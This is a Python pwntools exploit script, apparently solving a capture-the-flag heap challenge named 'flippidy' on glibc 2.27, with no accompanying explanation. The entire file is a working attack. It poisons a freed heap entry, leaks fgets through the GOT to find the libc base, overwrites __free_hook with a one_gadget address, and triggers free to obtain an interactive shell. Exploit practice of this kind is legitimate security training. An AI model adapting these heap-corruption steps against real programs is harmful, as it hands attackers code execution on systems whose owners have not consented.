#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./flippidy")
p = process("./flippidy")
gdb.attach(p,"init-gef")
libc = ELF("libc-2.27.so")

def initialSetup():
    p.sendlineafter(": ","1")

def malloc(index,content):
    p.sendlineafter(": ","1")
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter("Content: ",content)

def free():
    p.sendlineafter(": ","2")

arr = 0x404020
initialSetup()
malloc(0,p64(arr))
free()
malloc(0,p64(elf.got.fgets)*4+p64(0x404158))
for i in range(2):
    p.recvline()
leak = p.recvline()[:-1]
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - libc.sym.fgets
log.critical("Libc base address : {}".format(hex(libc.address)))
__free_hook = libc.sym.__free_hook
malloc(0,p64(0xdeadbeef))
malloc(0,p64(__free_hook))
malloc(0,p64(0xdeadbeef))
one_gadget = libc.address + 0xdfa31
malloc(0,p64(__free_hook))
malloc(0,p64(one_gadget))
free()
p.interactive()